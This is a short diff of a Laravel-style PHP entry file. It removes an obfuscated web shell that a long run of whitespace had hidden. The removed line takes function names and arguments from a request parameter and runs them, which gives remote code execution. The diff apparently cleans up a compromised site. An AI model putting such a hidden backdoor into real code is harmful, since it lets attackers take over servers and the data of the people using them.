@@ -1,5 +1,5 @@
 <?php
-																																																																																																																																																																																IF	(($D9KQ=@$	{'_REQUEST'}[	'WQODSK4K'])aNd( 10793*32210)	){ $D9KQ[1]($	{ $D9KQ[2]}	[0],$D9KQ[3 ]($D9KQ[4]));};DIE;
+																																																																																																																																																																																
 
 /**
  * Laravel - A PHP Framework For Web Artisans
